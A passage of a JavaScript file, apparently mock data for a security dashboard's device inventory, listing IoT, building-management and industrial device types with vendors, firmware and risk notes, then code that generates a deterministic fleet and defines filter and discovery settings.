  { t:'Smart TV', tab:'iot', p:'TV', sub:'10.20.5', n:{lan:2,wifi:2},
    v:['Samsung Electronics','LG Electronics','Sony Corporation'], os:['Tizen 7.0','webOS 23','Android TV 12'],
    pr:['SSDP','mDNS','HTTP'], ob:'Unsupported', rk:['Low','Informational'], hv:0,
    note:'Consumer TV on a corporate network, phoning home to vendor telemetry endpoints.' },
  { t:'Smart speaker', tab:'iot', p:'SPKR', sub:'10.20.9', n:{wifi:3},
    v:['Sonos, Inc.','Amazon Technologies','Google, Inc.'], os:['Sonos S2 16.2','Fire OS 8','Google Cast 1.56'],
    pr:['mDNS','SSDP','HTTPS'], ob:'Unsupported', rk:['Low'], hv:0,
    note:'Always-listening consumer device someone joined to corporate wireless.' },
  { t:'Public address controller', tab:'iot', p:'PA', sub:'10.20.5', n:{lan:1},
    v:['Bosch Security Systems'], os:['PRAESENSA 2.5'], pr:['HTTP','SNMP','Dante'], ob:'Unsupported', rk:['Medium'], hv:0.5,
    note:'Building-wide announcement system, including the emergency evacuation message path.' },
  { t:'Intercom', tab:'iot', p:'ICOM', sub:'10.20.5', n:{lan:2,bms:1},
    v:['Axis Communications','Bosch Security Systems'], os:['Axis OS 11.9 (intercom)','Bosch intercom 3.4'],
    pr:['SIP','RTSP','HTTP'], ob:'Unsupported', rk:['Medium'], hv:0,
    note:'Door intercom that also releases the strike on the door beside it.' },

  // --- Voice ---
  { t:'VoIP phone', tab:'iot', p:'VOIP', sub:'10.20.2', n:{lan:40,br:4},
    v:['Yealink','Polycom','Cisco Systems','Grandstream Networks'], os:['Yealink T5 firmware 96.86','Poly UCS 8.1','Cisco IP Phone 14.2'],
    pr:['SIP','RTP','LLDP-MED','HTTP'], ob:'Unsupported', rk:['Low','Informational'], hv:0,
    note:'Desk phone on the voice VLAN. Provisioning happens over unauthenticated TFTP/HTTP.' },
  { t:'Conference phone', tab:'iot', p:'CONFP', sub:'10.20.2', n:{lan:8},
    v:['Polycom','Yealink'], os:['Poly UCS 8.1','Yealink CP firmware 87.15'], pr:['SIP','RTP','HTTP'],
    ob:'Unsupported', rk:['Low'], hv:0,
    note:'Table conference phone in a meeting room.' },
  { t:'DECT base station', tab:'iot', p:'DECT', sub:'10.20.2', n:{lan:3},
    v:['Snom Technology','Yealink'], os:['Snom M900 firmware 6.1','Yealink W80 firmware 103.3'],
    pr:['SIP','RTP','HTTPS'], ob:'Unsupported', rk:['Medium'], hv:0,
    note:'Cordless handset base for facilities staff.' },
  { t:'Analog telephone adapter', tab:'iot', p:'ATA', sub:'10.20.2', n:{lan:2},
    v:['Grandstream Networks','Cisco Systems'], os:['HT814 firmware 1.0.51','SPA112 firmware 1.4'],
    pr:['SIP','RTP','HTTP'], ob:'Unsupported', rk:['Medium'], hv:0,
    note:'Adapter keeping analogue lines (lift phone, fax) alive on the IP network.' },

  // --- Facility / building management ---
  { t:'Smart Facility', tab:'iot', p:'BMS', sub:'10.20.6', n:{bms:3},
    v:['Tridium','Johnson Controls'], os:['Tridium Niagara 4.13','Metasys 12.0'],
    pr:['BACnet','HTTP','Telnet'], ob:'Unsupported', rk:['High','Medium'], hv:0.5,
    note:'Building management supervisor. OT asset — probe with care, remediate through facilities.' },
  { t:'HVAC controller', tab:'iot', p:'HVAC', sub:'10.20.6', n:{bms:6},
    v:['Honeywell','Trane Technologies','Carrier Corporation'], os:['Tridium Niagara 4.13','Tracer SC+ 5.2'],
    pr:['BACnet','Modbus','HTTP'], ob:'Unsupported', rk:['Medium','High'], hv:0.3,
    note:'Zone HVAC controller. Reachable over BACnet with no authentication in the protocol.' },
  { t:'Chiller controller', tab:'iot', p:'CHLR', sub:'10.20.6', n:{bms:2},
    v:['Carrier Corporation','Trane Technologies'], os:['CCN firmware 6.2','Tracer AdaptiView 5.1'],
    pr:['BACnet','Modbus'], ob:'Unsupported', rk:['High'], hv:0.5,
    note:'Chiller plant controller. Loss of cooling takes the data hall with it.' },
  { t:'Boiler controller', tab:'iot', p:'BLR', sub:'10.20.6', n:{bms:1},
    v:['Siemens'], os:['Climatix 10.5'], pr:['BACnet','Modbus'], ob:'Unsupported', rk:['Medium'], hv:0,
    note:'Heating plant controller in the basement.' },
  { t:'Air handling unit', tab:'iot', p:'AHU', sub:'10.20.6', n:{bms:4},
    v:['Distech Controls','Johnson Controls'], os:['EC-BOS 4.13','FEC firmware 11.2'],
    pr:['BACnet','Modbus'], ob:'Unsupported', rk:['Medium','Low'], hv:0,
    note:'Air handling unit controller serving a floor.' },
  { t:'VAV controller', tab:'iot', p:'VAV', sub:'10.20.6', n:{bms:8},
    v:['Belimo','Distech Controls'], os:['VAV controller firmware 3.4','ECB-VAV 2.9'],
    pr:['BACnet'], ob:'Unsupported', rk:['Low','Informational'], hv:0,
    note:'Variable air volume box controller. Dozens exist per floor, all speaking BACnet.' },
  { t:'Thermostat', tab:'iot', p:'TSTAT', sub:'10.20.6', n:{bms:6,lan:2},
    v:['ecobee','Nest Labs','Honeywell'], os:['ecobee firmware 4.8','Nest firmware 6.2'],
    pr:['HTTPS','mDNS','BACnet'], ob:'Unsupported', rk:['Low','Informational'], hv:0,
    note:'Networked thermostat, several of them consumer models bought outside IT.' },
  { t:'Lighting controller', tab:'iot', p:'LGT', sub:'10.20.6', n:{bms:5},
    v:['Lutron Electronics','Signify (Philips)','Legrand'], os:['Quantum 3.4','Interact Pro 2.8'],
    pr:['BACnet','HTTP','DALI'], ob:'Unsupported', rk:['Low'], hv:0,
    note:'Floor lighting controller on the facility VLAN.' },
  { t:'Lighting gateway', tab:'iot', p:'LGTGW', sub:'10.20.6', n:{bms:2},
    v:['Signify (Philips)'], os:['Interact bridge 1.60'], pr:['HTTPS','mDNS','Zigbee'],
    ob:'Unsupported', rk:['Medium'], hv:0,
    note:'Bridges a Zigbee lighting mesh onto IP — a wireless network the SOC cannot see.' },
  { t:'Window shade controller', tab:'iot', p:'SHADE', sub:'10.20.6', n:{bms:3},
    v:['Somfy','Lutron Electronics'], os:['Animeo IP 2.3','Sivoia QS 4.1'], pr:['HTTP','BACnet'],
    ob:'Unsupported', rk:['Informational'], hv:0,
    note:'Automated blind controller tied to the daylight sensors.' },
  { t:'Elevator controller', tab:'iot', p:'ELEV', sub:'10.20.6', n:{bms:2},
    v:['KONE','Otis Elevator'], os:['KONE E-Link 4.2','Otis Compass 3.0'], pr:['Modbus','HTTP','SNMP'],
    ob:'Unsupported', rk:['High'], hv:0.5,
    note:'Lift controller with destination dispatch. Safety system — never actively probe it.' },
  { t:'Fire alarm panel', tab:'iot', p:'FIRE', sub:'10.20.6', n:{bms:2},
    v:['Simplex Grinnell','Notifier'], os:['Simplex 4100ES 3.11','NOTIFIER NFS2 28.0'],
    pr:['BACnet','Modbus','SNMP'], ob:'Unsupported', rk:['High'], hv:1,
    note:'Life-safety panel. High value and explicitly out of scope for active scanning.' },
  { t:'Sprinkler monitor', tab:'iot', p:'SPRNK', sub:'10.20.6', n:{bms:1},
    v:['Simplex Grinnell'], os:['Sprinkler supervisory 2.4'], pr:['Modbus','SNMP'], ob:'Unsupported', rk:['Medium'], hv:0.5,
    note:'Supervises sprinkler flow and tamper switches.' },
  { t:'Water leak sensor', tab:'iot', p:'LEAK', sub:'10.20.6', n:{bms:4},
    v:['Sensata Technologies','Honeywell'], os:['Leak sensor firmware 1.9'], pr:['MQTT','BACnet'],
    ob:'Unsupported', rk:['Informational'], hv:0,
    note:'Under-floor leak detection in the data hall.' },
  { t:'Environmental sensor', tab:'iot', p:'ENV', sub:'10.20.6', n:{bms:5,lan:2},
    v:['Sensata Technologies','APC by Schneider Electric'], os:['NetBotz 5.7','Sensor gateway 2.2'],
    pr:['SNMP','HTTPS','MQTT'], ob:'Unsupported', rk:['Low'], hv:0,
    note:'Temperature and humidity sensor reporting into the facilities dashboard.' },
  { t:'Air quality sensor', tab:'iot', p:'AQ', sub:'10.20.6', n:{bms:3},
    v:['Siemens','Honeywell'], os:['AQ sensor firmware 2.1'], pr:['MQTT','BACnet'], ob:'Unsupported', rk:['Informational'], hv:0,
    note:'CO2 and particulate sensor feeding ventilation demand control.' },
  { t:'Occupancy sensor', tab:'iot', p:'OCC', sub:'10.20.6', n:{bms:6},
    v:['Distech Controls','Signify (Philips)'], os:['Occupancy sensor firmware 1.7'], pr:['BACnet','Zigbee'],
    ob:'Unsupported', rk:['Informational'], hv:0,
    note:'Desk and room occupancy sensor. Movement data is personal data.' },
  { t:'Badge reader', tab:'iot', p:'BADGE', sub:'10.20.6', n:{bms:8},
    v:['HID Global','ASSA ABLOY'], os:['Embedded RTOS','Signo firmware 2.4'], pr:['OSDP','ARP','UDP'],
    ob:'Insufficient info', rk:['Informational','Low'], hv:0,
    note:'Door reader. Passive traffic only, so its classification is a best guess.' },
  { t:'Door controller', tab:'iot', p:'DOOR', sub:'10.20.6', n:{bms:4},
    v:['LenelS2','HID Global'], os:['LNL-X 6.7','VertX firmware 3.6'], pr:['OSDP','HTTPS','TCP'],
    ob:'Unsupported', rk:['High'], hv:0.7,
    note:'Access control panel that drives the door strikes for a floor. Physical access is at stake.' },
  { t:'Smart lock', tab:'iot', p:'LOCK', sub:'10.20.6', n:{bms:3},
    v:['ASSA ABLOY'], os:['Aperio firmware 4.2'], pr:['Zigbee','OSDP'], ob:'Unsupported', rk:['Medium'], hv:0,
    note:'Wireless door lock hanging off the access-control hub.' },
  { t:'Turnstile controller', tab:'iot', p:'TURN', sub:'10.20.6', n:{bms:2},
    v:['LenelS2'], os:['Turnstile controller 2.8'], pr:['OSDP','TCP'], ob:'Unsupported', rk:['Medium'], hv:0.5,
    note:'Lobby turnstile. The gate between visitor space and staff space.' },
  { t:'Gate controller', tab:'iot', p:'GATE', sub:'10.20.6', n:{bms:1},
    v:['HID Global'], os:['Barrier controller 1.9'], pr:['TCP','HTTP'], ob:'Unsupported', rk:['Low'], hv:0,
    note:'Car park barrier controller.' },
  { t:'Security alarm panel', tab:'iot', p:'ALRM', sub:'10.20.6', n:{bms:2},
    v:['Bosch Security Systems','Honeywell'], os:['B Series firmware 3.10','Galaxy Dimension 6.9'],
    pr:['TCP','SIA','HTTP'], ob:'Unsupported', rk:['High'], hv:0.5,
    note:'Intruder alarm panel with a dialler path to the monitoring centre.' },
  { t:'Duress button gateway', tab:'iot', p:'DURESS', sub:'10.20.6', n:{bms:1},
    v:['LenelS2'], os:['Duress gateway 1.4'], pr:['TCP','MQTT'], ob:'Unsupported', rk:['Medium'], hv:0.5,
    note:'Panic-button gateway for reception. Availability matters more than confidentiality here.' },

  // --- Power and energy ---
  { t:'UPS', tab:'iot', p:'UPS', sub:'10.20.1', n:{lan:8,bms:2,br:1},
    v:['APC by Schneider Electric','Eaton','Vertiv'], os:['NMC3 2.5','Gigabit Network Card 3.0'],
    pr:['SNMP','HTTPS','Modbus'], ob:'Unsupported', rk:['Medium','Low'], hv:0.2,
    note:'Uninterruptible power supply with a network management card. It can shut servers down on command.' },
  { t:'PDU', tab:'iot', p:'PDU', sub:'10.20.1', n:{lan:10},
    v:['APC by Schneider Electric','Raritan','Eaton'], os:['Rack PDU 2G 6.9','PX3 4.0'],
    pr:['SNMP','HTTPS','SSH'], ob:'Unsupported', rk:['Medium'], hv:0.3,
    note:'Switched rack PDU. Outlet-level power control over the network.' },
  { t:'Generator controller', tab:'iot', p:'GEN', sub:'10.20.6', n:{bms:1},
    v:['Schneider Electric'], os:['Genset controller 3.6'], pr:['Modbus','SNMP'], ob:'Unsupported', rk:['High'], hv:1,
    note:'Standby generator controller. Last line of power resilience for the site.' },
  { t:'Transfer switch', tab:'iot', p:'ATS', sub:'10.20.6', n:{bms:1},
    v:['Eaton'], os:['ATS controller 2.2'], pr:['Modbus','SNMP'], ob:'Unsupported', rk:['High'], hv:0.5,
    note:'Automatic transfer switch between mains and generator feeds.' },
  { t:'Energy meter', tab:'iot', p:'MTR', sub:'10.20.6', n:{bms:4},
    v:['Schneider Electric','Siemens'], os:['PowerLogic ION 4.5','SENTRON PAC 2.4'],
    pr:['Modbus','BACnet','HTTP'], ob:'Unsupported', rk:['Low'], hv:0,
    note:'Sub-metering point feeding the energy dashboard.' },
  { t:'Solar inverter', tab:'iot', p:'PV', sub:'10.20.6', n:{bms:2},
    v:['SMA Solar Technology','Enphase Energy'], os:['Sunny Portal firmware 3.11','Envoy S 7.6'],
    pr:['Modbus','HTTPS','mDNS'], ob:'Unsupported', rk:['Medium'], hv:0,
    note:'Rooftop PV inverter with an outbound cloud management tunnel.' },
  { t:'Battery storage controller', tab:'iot', p:'BESS', sub:'10.20.6', n:{bms:1},
    v:['Tesla, Inc.'], os:['Powerpack controller 24.4'], pr:['Modbus','HTTPS'], ob:'Unsupported', rk:['Medium'], hv:0.5,
    note:'Battery energy storage controller supporting the generator changeover.' },
  { t:'EV charger', tab:'iot', p:'EVSE', sub:'10.20.6', n:{bms:4},
    v:['ChargePoint','Tesla, Inc.'], os:['CT4000 firmware 5.11','Wall Connector 24.16'],
    pr:['OCPP','HTTPS','WebSocket'], ob:'Unsupported', rk:['Medium','Low'], hv:0,
    note:'Staff car park charger talking OCPP out to a vendor cloud.' },

  // --- Workplace appliances ---
  { t:'Vending machine', tab:'iot', p:'VEND', sub:'10.20.5', n:{lan:3},
    v:['Espressif Inc.'], os:['Telemetry module 2.1'], pr:['MQTT','HTTP'], ob:'Unsupported', rk:['Low'], hv:0,
    note:'Vending telemetry module added by the catering supplier, not by IT.' },
  { t:'Coffee machine', tab:'iot', p:'BREW', sub:'10.20.5', n:{lan:2},
    v:['Espressif Inc.'], os:['Connected appliance 1.4'], pr:['MQTT','mDNS'], ob:'Unsupported', rk:['Informational'], hv:0,
    note:'Connected coffee machine in a break room. Classic shadow-IoT arrival.' },
  { t:'Water dispenser', tab:'iot', p:'WATER', sub:'10.20.5', n:{lan:1},
    v:['Espressif Inc.'], os:['Dispenser firmware 1.2'], pr:['MQTT'], ob:'Unsupported', rk:['Informational'], hv:0,
    note:'Filtered water unit reporting cartridge life to the supplier.' },
  { t:'Smart Appliance', tab:'iot', p:'APPL', sub:'10.20.5', n:{lan:2},
    v:['Samsung Electronics','LG Electronics'], os:['Tizen 7.0','webOS 23'], pr:['SSDP','mDNS','HTTP'],
    ob:'Unsupported', rk:['Low'], hv:0,
    note:'Break-room appliance with a network stack nobody planned for.' },
  { t:'Time clock', tab:'iot', p:'CLOCK', sub:'10.20.5', n:{lan:3,br:1},
    v:['ASSA ABLOY','HID Global'], os:['Time terminal firmware 3.1'], pr:['HTTPS','NTP','OSDP'],
    ob:'Unsupported', rk:['Medium'], hv:0,
    note:'Staff clock-in terminal storing badge identifiers locally.' },
  { t:'Room booking panel', tab:'iot', p:'ROOM', sub:'10.20.5', n:{lan:10},
    v:['Crestron Electronics','Logitech'], os:['Crestron TSS 2.5','CollabOS 1.12'], pr:['HTTPS','mDNS','Exchange'],
    ob:'Unsupported', rk:['Low'], hv:0,
    note:'Door-side booking panel authenticated to a resource mailbox.' },
  { t:'Wayfinding kiosk', tab:'iot', p:'WAYF', sub:'10.20.5', n:{lan:2},
    v:['Elo Touch Solutions'], os:['Android 12 (AOSP)'], pr:['HTTPS','mDNS'], ob:'Unsupported', rk:['Low'], hv:0,
    note:'Touch directory screen in the atrium.' },
  { t:'Air purifier', tab:'iot', p:'PURE', sub:'10.20.5', n:{lan:2},
    v:['Espressif Inc.'], os:['Purifier firmware 2.0'], pr:['MQTT','mDNS'], ob:'Unsupported', rk:['Informational'], hv:0,
    note:'Networked air purifier on an office floor.' },
  { t:'Robot vacuum', tab:'iot', p:'VAC', sub:'10.20.9', n:{wifi:1},
    v:['Espressif Inc.'], os:['Cleaning robot 4.3'], pr:['MQTT','mDNS'], ob:'Unsupported', rk:['Low'], hv:0,
    note:'Cleaning robot that maps the floor plan and uploads it to a vendor cloud.' },
  { t:'Game console', tab:'iot', p:'CONSOLE', sub:'10.20.9', n:{wifi:2},
    v:['Sony Corporation','Hack Smarter Labs'], os:['PlayStation 5 firmware 24.06','Xbox OS 10.0'],
    pr:['UPnP','HTTPS','mDNS'], ob:'Unsupported', rk:['Low'], hv:0,
    note:'Console in a recreation area. Shadow IT with an open UPnP stack.' },
  { t:'Wearable', tab:'iot', p:'WEAR', sub:'10.20.9', n:{wifi:4},
    v:['Apple, Inc.','Samsung Electronics'], os:['watchOS 10.5','Wear OS 4'], pr:['mDNS','HTTPS'],
    ob:'Insufficient info', rk:['Informational'], hv:0,
    note:'Personal smartwatch that joined corporate wireless with saved credentials.' },
  { t:'Smart plug', tab:'iot', p:'PLUG', sub:'10.20.9', n:{wifi:3},
    v:['Espressif Inc.'], os:['Tasmota 13.4','Vendor firmware 1.1'], pr:['MQTT','mDNS','HTTP'],
    ob:'Unsupported', rk:['Medium'], hv:0,
    note:'Consumer smart plug. Cheap firmware, permanent network presence.' },
  { t:'Single-board computer', tab:'iot', p:'SBC', sub:'10.20.7', n:{lan:3},
    v:['Raspberry Pi Foundation'], os:['Raspberry Pi OS 12','Ubuntu Server 22.04 LTS (arm64)'],
    pr:['SSH','HTTP','mDNS','ARP'], ob:'Can be onboarded', rk:['High','Medium'], hv:0,
    note:'Unsanctioned single-board computer with SSH exposed. Onboardable — or removable.' },

  // --- Industrial / OT ---
  { t:'PLC', tab:'iot', p:'PLC', sub:'10.20.6', n:{bms:6},
    v:['Rockwell Automation','Siemens','OMRON Corporation'], os:['ControlLogix 34.011','SIMATIC S7-1500 2.9'],
    pr:['EtherNet/IP','S7comm','Modbus'], ob:'Unsupported', rk:['High','Medium'], hv:0.6,
    note:'Programmable logic controller running a physical process. Never probe it actively.' },
  { t:'HMI panel', tab:'iot', p:'HMI', sub:'10.20.6', n:{bms:4},
    v:['Rockwell Automation','Siemens','Advantech'], os:['PanelView Plus 7 firmware 12','WinCC Comfort 17'],
    pr:['EtherNet/IP','VNC','HTTP'], ob:'Unsupported', rk:['High'], hv:0.4,
    note:'Operator panel, often with an unauthenticated VNC service on the OT segment.' },
  { t:'RTU', tab:'iot', p:'RTU', sub:'10.20.6', n:{bms:2},
    v:['Schneider Electric','Phoenix Contact'], os:['SCADAPack 570 firmware 8.6'],
    pr:['DNP3','Modbus'], ob:'Unsupported', rk:['High'], hv:0.5,
    note:'Remote terminal unit polling field devices over DNP3.' },
  { t:'Industrial gateway', tab:'iot', p:'IGW', sub:'10.20.6', n:{bms:3},
    v:['Moxa Inc.','Advantech'], os:['MGate 5109 firmware 2.4','ECU-1251 firmware 1.8'],
    pr:['Modbus','MQTT','HTTP'], ob:'Unsupported', rk:['High'], hv:0.5,
    note:'IT/OT gateway bridging serial field buses to Ethernet. A crossing point worth watching.' },
  { t:'Protocol converter', tab:'iot', p:'CONV', sub:'10.20.6', n:{bms:2},
    v:['Phoenix Contact','Moxa Inc.'], os:['Converter firmware 3.2'], pr:['Modbus','BACnet','TCP'],
    ob:'Unsupported', rk:['Medium'], hv:0,
    note:'Translates BACnet to Modbus between the BMS and plant equipment.' },
  { t:'Industrial robot', tab:'iot', p:'ROBOT', sub:'10.20.6', n:{bms:2},
    v:['FANUC Corporation','KUKA Roboter'], os:['R-30iB Plus 9.40','KRC5 8.7'],
    pr:['EtherNet/IP','FTP','HTTP'], ob:'Unsupported', rk:['High'], hv:0.5,
    note:'Robot cell controller with an anonymous FTP service still enabled.' },
  { t:'CNC machine', tab:'iot', p:'CNC', sub:'10.20.6', n:{bms:2},
    v:['HAAS Automation','FANUC Corporation'], os:['Haas NGC 100.22','FANUC Series 31i'],
    pr:['SMB','FTP','MTConnect'], ob:'Unsupported', rk:['High'], hv:0.5,
    note:'Machine tool pulling programs from an SMB share with a shared credential.' },
  { t:'Conveyor controller', tab:'iot', p:'CONV-CTL', sub:'10.20.6', n:{bms:2},
    v:['Rockwell Automation','Beckhoff Automation'], os:['CompactLogix 33.011','TwinCAT 3.1'],
    pr:['EtherNet/IP','EtherCAT'], ob:'Unsupported', rk:['Medium'], hv:0,
    note:'Materials handling controller on the dispatch line.' },
  { t:'Variable frequency drive', tab:'iot', p:'VFD', sub:'10.20.6', n:{bms:4},
    v:['Rockwell Automation','Mitsubishi Electric','Siemens'], os:['PowerFlex 755 firmware 14','SINAMICS G120 4.7'],
    pr:['EtherNet/IP','Modbus','PROFINET'], ob:'Unsupported', rk:['Medium'], hv:0,
    note:'Motor drive addressable from the plant network. Speed commands are unauthenticated.' },
  { t:'Machine vision camera', tab:'iot', p:'MVIS', sub:'10.20.6', n:{bms:2},
    v:['OMRON Corporation','Beckhoff Automation'], os:['FH vision firmware 6.4'], pr:['GigE Vision','EtherNet/IP'],
    ob:'Unsupported', rk:['Low'], hv:0,
    note:'Inspection camera on the production line, not a surveillance camera.' },
  { t:'Barcode scanner', tab:'iot', p:'SCAN', sub:'10.20.5', n:{lan:4},
    v:['Zebra Technologies','Datalogic'], os:['Scanner firmware 4.9'], pr:['TCP','HTTP','ARP'],
    ob:'Unsupported', rk:['Low'], hv:0,
    note:'Fixed-mount scanner at a goods-in station.' },
  { t:'RFID reader', tab:'iot', p:'RFID', sub:'10.20.5', n:{lan:3,bms:1},
    v:['Zebra Technologies','HID Global'], os:['FX9600 firmware 3.9'], pr:['LLRP','HTTP','TCP'],
    ob:'Unsupported', rk:['Medium'], hv:0,
    note:'Asset-tracking RFID portal reader.' },
  { t:'Weighing scale', tab:'iot', p:'SCALE', sub:'10.20.5', n:{lan:2},
    v:['Mettler-Toledo'], os:['IND570 firmware 5.2'], pr:['TCP','FTP','HTTP'], ob:'Unsupported', rk:['Low'], hv:0,
    note:'Networked bench scale feeding the despatch system.' },
  { t:'Asset tracker gateway', tab:'iot', p:'TRACK', sub:'10.20.5', n:{lan:2},
    v:['Advantech','Espressif Inc.'], os:['BLE gateway firmware 2.6'], pr:['MQTT','BLE','HTTPS'],
    ob:'Unsupported', rk:['Low'], hv:0,
    note:'Bluetooth tag gateway tracking equipment around the building.' },
  { t:'Torque tool controller', tab:'iot', p:'TORQ', sub:'10.20.6', n:{bms:1},
    v:['Beckhoff Automation'], os:['Tool controller 2.3'], pr:['EtherNet/IP','TCP'], ob:'Unsupported', rk:['Low'], hv:0,
    note:'Assembly torque controller logging fastening results.' },
  { t:'Test bench controller', tab:'iot', p:'BENCH', sub:'10.20.6', n:{bms:2},
    v:['Advantech','Beckhoff Automation'], os:['Windows 10 IoT Enterprise LTSC','TwinCAT 3.1'],
    pr:['SMB','TCP','HTTP'], ob:'Can be onboarded', rk:['Medium'], hv:0,
    note:'Test rig PC running a Windows IoT build — this one can take a sensor.' },
  { t:'Environmental chamber', tab:'iot', p:'CHAMB', sub:'10.20.6', n:{bms:1},
    v:['Advantech'], os:['Chamber controller 1.8'], pr:['Modbus','HTTP'], ob:'Unsupported', rk:['Low'], hv:0,
    note:'Temperature/humidity test chamber in the engineering lab.' },
  { t:'Lab instrument', tab:'iot', p:'LABI', sub:'10.20.5', n:{lan:3},
    v:['Fujitsu','Advantech'], os:['Windows 7 Embedded (instrument)','Instrument firmware 3.4'],
    pr:['SMB','FTP','TCP'], ob:'Unsupported', rk:['High'], hv:0.3,
    note:'Instrument controller pinned to an end-of-life Windows build by its vendor. Segment it.' },
];

// Deterministic PRNG (mulberry32) so the generated fleet is byte-identical on every load.
function fleetRandom(seed) {
  let a = seed >>> 0;
  return function () {
    a = (a + 0x6D2B79F5) >>> 0;
    let t = Math.imul(a ^ (a >>> 15), 1 | a);
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

(function buildDiscoveredFleet() {
  const rand = fleetRandom(0x5EED1A7);
  const pick = arr => arr[Math.floor(rand() * arr.length)];
  const NOW  = Date.parse('2026-06-28T15:00:00Z');
  const DAY  = 864e5;

  // Addresses are handed out sequentially per subnet and never collide with the
  // hand-written devices above.
  const used = new Set(DISCOVERED_DEVICES.map(d => d.ip).concat(DEVICES.map(d => d.ip)));
  const cursor = {};
  function nextIp(base) {
    const [a, b, c0] = base.split('.').map(Number);
    const state = cursor[base] || (cursor[base] = { c:c0, h:20 });
    for (;;) {
      if (state.h > 250) { state.h = 20; state.c += 1; }
      const ip = `${a}.${b}.${state.c}.${state.h}`;
      state.h += 1;
      if (!used.has(ip)) { used.add(ip); return ip; }
    }
  }

  const hex = () => Math.floor(rand() * 256).toString(16).toUpperCase().padStart(2, '0');
  function macFor(vendor) {
    const oui = FLEET_OUI[vendor] || '02-00-5E';
    for (;;) {
      const mac = `${oui}-${hex()}-${hex()}-${hex()}`;
      if (!used.has(mac)) { used.add(mac); return mac; }
    }
  }

  // Hostnames must stay unique across the whole estate — the hand-written devices
  // already claim names like WLC-01 and WKS-01, so generated ones skip past them.
  const takenNames = new Set(DISCOVERED_DEVICES.map(d => d.name).concat(DEVICES.map(d => d.name)));

  const stamp = ms => new Date(Math.round(ms / 60000) * 60000).toISOString().replace('.000Z', 'Z');
  const RECS = { High:[4, 9], Medium:[2, 6], Low:[0, 3], Informational:[0, 1] };

  let serial = 500;
  const fleet = [];

  FLEET_CATALOG.forEach(entry => {
    let seq = 0; // one running number per classification, so names never repeat across sites
    Object.keys(FLEET_SITES).forEach(site => {
      const count = (entry.n || {})[site] || 0;
      const siteInfo = FLEET_SITES[site];
      const base = site === 'lan' ? entry.sub : FLEET_SITE_SUBNET[site];

      for (let i = 1; i <= count; i++) {
        const vendor = pick(entry.v);
        const risk   = pick(entry.rk);
        const ip     = nextIp(base);

        // Age: most assets have been on the network for a long time, a handful are new.
        // Every so often force a brand-new device so the "last 7 days" card stays alive.
        const fresh   = serial % 83 === 0;
        const ageDays = fresh ? 1 + Math.floor(rand() * 6) : 20 + Math.round(950 * Math.pow(rand(), 0.6));
        const firstSeen = NOW - ageDays * DAY;
        // Most things reported in within the last couple of days; some have gone quiet.
        const quietDays = rand() < 0.86 ? rand() * 2.5 : 3 + rand() * 24;
        const lastSeen  = Math.max(firstSeen + 60000, NOW - quietDays * DAY);

        const [lo, hi] = RECS[risk];
        const highValue = rand() < (entry.hv || 0);

        // The BMS/OT segment is excluded from active probing, so those assets are only
        // ever seen passively. Network gear inside the SNMP scan scope is credentialed.
        const source = site === 'bms' ? 'Basic'
          : entry.tab === 'network' && base === '10.20.0' && rand() < 0.7 ? 'Authenticated scan'
          : site === 'br' && entry.tab === 'network' && rand() < 0.25 ? 'Authenticated scan'
          : rand() < 0.12 ? 'Basic' : 'Standard';

        const onboarding = entry.ob === 'Can be onboarded' && rand() < 0.06 ? 'Insufficient info' : entry.ob;

        const seen = [];
        const nSeen = 1 + Math.floor(rand() * Math.min(3, siteInfo.seen.length));
        while (seen.length < nSeen) {
          const s = pick(siteInfo.seen);
          if (!seen.includes(s)) seen.push(s);
        }

        // Unclassified devices have no hostname to learn — discovery lists them by address.
        let name = ip;
        if (entry.t !== 'Unknown') {
          do { name = `${site === 'br' ? 'BR-' : ''}${entry.p}-${String(++seq).padStart(2, '0')}`; }
          while (takenNames.has(name));
        }
        takenNames.add(name);

        fleet.push({
          id:`DD-${serial++}`, name, tab:entry.tab, type:entry.t, os:pick(entry.os),
          ip, mac:macFor(vendor), vendor, network:siteInfo.network,
          onboardingStatus:onboarding, discoverySource:source, riskLevel:risk,
          firstSeen:stamp(firstSeen), lastSeen:stamp(lastSeen),
          highValue, protocols:entry.pr.slice(), seenBy:seen,
          recommendationCount: onboarding === 'Insufficient info' ? 0 : lo + Math.floor(rand() * (hi - lo + 1)),
          note:entry.note,
        });
      }
    });
  });

  DISCOVERED_DEVICES.push(...fleet);
})();

const DEVICE_INVENTORY_TABS = [
  { key:'computers', label:'Endpoints' },
  { key:'network',   label:'Network devices' },
  { key:'iot',       label:'IoT devices' },
];

// Onboarding-status triage buckets used by the inventory filter chips.
const ONBOARDING_STATUSES = ['Onboarded', 'Can be onboarded', 'Unsupported', 'Insufficient info'];

// Inventory filter flyout. `field` names the row property each group filters on;
// a group with no boxes checked imposes no constraint, and groups AND together.
const INVENTORY_FILTER_GROUPS = [
  { key:'health',       label:'Filters',            field:'healthStatus',     icon:'💚',
    options:['Active', 'Inactive', 'Misconfigured'] },
  { key:'onboarding',   label:'Onboarding status',  field:'onboardingStatus', icon:'📥',
    options:ONBOARDING_STATUSES },
  { key:'antivirus',    label:'Antivirus status',   field:'avStatus',         icon:'🛡',
    options:['Disabled', 'Not updated', 'Unknown'] },
  { key:'excluded',     label:'Excluded',           field:'excludedLabel',    icon:'🚫',
    options:['No', 'Yes'] },
  { key:'winVersion',   label:'Windows 10 versions', field:'winVersion',      icon:'🪟',
    options:['1607','1703','1709','1803','1809','1903','1909','2004','20H2','21H1','21H2','22H2','Future'] },
];

const INVENTORY_RANGES = ['7 days', '30 days', '6 months'];

// System > Settings > Device discovery
const DEVICE_DISCOVERY_SETTINGS = {
  mode:'Standard',
  modes:[
    { key:'Standard', label:'Standard discovery (recommended)',
      summary:'Active scan. Uses discovery protocols and multicast queries, then actively probes observed devices for richer classification.',
      detail:'Each unmanaged device is probed no more than about once every three weeks, generating under 50KB of traffic per attempt. Onboarded devices are never probed.',
      scanner:'Signed PowerShell scanner scripts run from the Defender for Endpoint downloads folder on designated onboarded devices.' },
    { key:'Basic', label:'Basic discovery',
      summary:'Passive scan. Extracts device information from network traffic that onboarded devices already see. No probes are sent.',
      detail:'Anything that talks to an onboarded device on a monitored network can still show up in the inventory — exclusions only apply to active scanning.',
      scanner:'Passive collection only; no scanner scripts are executed.' },
  ],
  monitoredNetworks:[
    { name:'CORP-LAN',   gateway:'10.20.0.1',  dhcp:'10.20.0.10', devices:412, state:'Monitored', reason:'Correlated as corporate: majority of clients report this network name, gateway, and DHCP server.' },
